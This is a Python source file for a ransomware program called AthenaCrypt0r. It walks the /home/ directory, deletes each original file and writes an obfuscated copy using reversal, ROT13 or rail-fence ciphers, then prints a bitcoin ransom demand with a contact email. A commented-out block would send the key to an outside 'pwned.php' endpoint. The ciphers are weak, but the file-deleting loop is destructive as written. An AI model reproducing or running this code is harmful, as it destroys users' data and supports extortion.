import getdirs
import os
import hashlib as h
import random as r
import time as t
import urllib.request
import reverseCryptor as rc
import caeser as ca
import railfence as rail

def generateKey():	
    keyName = "\x43\x72\x79\x70\x74\x30\x72" #Secret for keygen	
    salt = map(ord, keyName) # run KeyName through the ord function, set the value to salt	
    r.seed(int(t.time()+r.randint(1,1337))) # generate a peusdo random seed for random	
    key = h.pbkdf2_hmac('sha512', bytes(r.randint(1, 65500)), bytes(salt), r.randint(30000,60000)) # generate the encryption key - SHA512 salted, ran over a random amount of times	
    encryptionKey = key.hex() # dump the key	

    return encryptionKey #return it to the main function	


def main(key):

    if os.name == "nt":
        path = "C:/TestFolder/"
    else:
        path = "/home/"

    files = getdirs.getdirs(path)

    # Randomly chooses an encryption algorithm and runs it.
    EncryptionAlgorithms = [reverseCryptor,caeser,RailfenceEncrypt]
    r.choice(EncryptionAlgorithms)(files)

    bitcoin = r.random()
    '''
    data = parse.urlencode(key).encode()
    req =  request.Request("http://AthenaMalware.io/pwned.php", data=data) 
    resp = request.urlopen(req)
    '''
    
    print("============================================================================================")
    print("All your files have been encrypted with AthenaCrypt0r :)")
    print("To ever see your files again, please email athena@protonmail.ch with the following key: "+key)
    print("Please be prepared to pay "+ str(bitcoin) + " BTC for the safe release of your files")
    print("You can learn how to buy bitcoin here: https://www.coinbase.com/buy-bitcoin")
    print("============================================================================================")
    input("Please press any key to exit.")


def reverseCryptor(files):
    outputfile = ".AthenaCrypt0r"
    for file in files:
        f = open(file, "r")
        contents = f.read()
        #print(contents)
        f.close()
        os.remove(file)
        encrypted = rc.reverse(contents)
        #print(encrypted)
        f1 = open(file+outputfile, "w")
        f1.write(encrypted)
        f1.close()

def RailfenceEncrypt(files):
    outputfile = ".AthenaCrypt0r"
    key = 3
    for file in files:
        f = open(file, "r")
        contents = f.read()
        #print(contents)
        f.close()
        os.remove(file)
        encrypted = rail.encryptRailFence(contents, key)
        #print(encrypted)
        f1 = open(file+outputfile, "w")
        f1.write(encrypted)
        f1.close()

def caeser(files):
    outputfile = ".AthenaCrypt0r"
    shift = 13
    for file in files:
        f = open(file, "r")
        contents = f.read()
        #print(contents)
        f.close()
        os.remove(file)
        encrypted = ca.caesar(contents, shift)
        print(encrypted)
        f1 = open(file+outputfile, "w")
        f1.write(encrypted)
        f1.close()

if __name__=="__main__":
    main(generateKey())